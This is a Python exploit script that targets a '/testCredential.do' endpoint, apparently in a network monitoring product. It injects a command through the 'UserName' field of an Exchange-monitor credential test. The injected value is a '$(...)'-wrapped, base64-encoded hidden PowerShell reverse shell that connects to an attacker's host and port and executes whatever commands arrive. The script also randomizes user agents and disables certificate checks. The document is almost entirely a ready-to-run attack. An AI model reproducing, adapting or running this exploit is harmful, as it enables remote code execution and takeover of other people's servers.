#!/usr/bin/python3
import requests
import urllib3
import urllib.parse
import os
import sys
import base64
from random_useragent.random_useragent import Randomize     # Randomize useragent

# Optionally, use a proxy
# proxy = "http://<user>:<pass>@<proxy>:<port>"
proxy = ""
os.environ['http_proxy'] = proxy
os.environ['HTTP_PROXY'] = proxy
os.environ['https_proxy'] = proxy
os.environ['HTTPS_PROXY'] = proxy

# Disable cert warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Set timeout
timeout = 5

# Handle CTRL-C
def keyboard_interrupt():
    """Handles keyboardinterrupt exceptions"""
    print("\n\n[*] User requested an interrupt, exiting...")
    exit(0)

# Custom headers
def http_headers():
    # Randomize useragent
    useragent = Randomize().random_agent('desktop', 'windows')
    headers = {
        'User-Agent': useragent,
    }
    return headers

def doRequest(url,headers,payload):
    params = {
            'method':'testCredentialForConfMonitors',
            'type':'Exchange-server',
            'method':'createMonitor',
            'displayname':'Exchange test',
            'HostName':'localhost',
            'version':'selectversion',
            'UserName':payload,
            'Password':'1234',
            'UsePowershell':'Yes',
            'Advanced':'False',
    }
    try:
        r = requests.post(url=url,headers=headers,data=params,verify=False)
    except:
        print("[!] Something went wrong sending the request, please check...\n")
        exit(-1)

def createPayload(revhost,revport):
    prefix = "$("
    suffix = ")"
    ps_command = "powershell.exe -ep bypass -nol -noni -w hidden -nop -e "
    ps_template = ("$client = New-Object System.Net.Sockets.TCPClient('" + revhost + "'," + str(revport) + ");" +
                "$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};" +
                "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;+" +
                "$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);" +
                "$sendback = (iex $data 2>&1 | Out-String );" +
                "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';" +
                "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);" +
                "$stream.Write($sendbyte,0,$sendbyte.Length);" +
                "$stream.Flush()};\n")
    ps_template_b64 = base64.b64encode(ps_template.encode("utf_16_le"))
    payload = prefix + ps_command + ps_template_b64.decode() + suffix
    return urllib.parse.quote(payload)

# Main
def main(argv):
    if len(sys.argv) == 4:
        host = sys.argv[1]
        revhost = sys.argv[2]
        revport = int(sys.argv[3])
    else:
        print("[*] Usage: " + sys.argv[0] + " <host> <revhost> <revport>")
        print("[*] Example: " + sys.argv[0] + " https://192.168.252.12:8443 192.168.252.15 6666\n")
        exit(0)

    # HTTP headers
    headers = http_headers()

    # URL page
    urlpage = "/testCredential.do"

    # Do stuff
    try:
        # Create Powershell payload
        payload = createPayload(revhost,revport)

        # Do request
        doRequest(host + urlpage,headers,payload)    
    except requests.exceptions.Timeout:
        print("[!] Timeout error\n")
        exit(-1)
    except requests.exceptions.TooManyRedirects:
        print("[!] Too many redirects\n")
        exit(-1)
    except requests.exceptions.ConnectionError:
        print("[!] Not able to connect to URL\n")
        exit(-1)
    except requests.exceptions.RequestException as e:
        print("[!] " + str(e))
        exit(-1)
    except requests.exceptions.HTTPError as e:
        print("[!] Failed with error code - " + e.code + "\n")
        exit(-1)
    except KeyboardInterrupt:
        keyboard_interrupt()

# If we were called as a program, go execute the main function.
if __name__ == "__main__":
    main(sys.argv[1:])
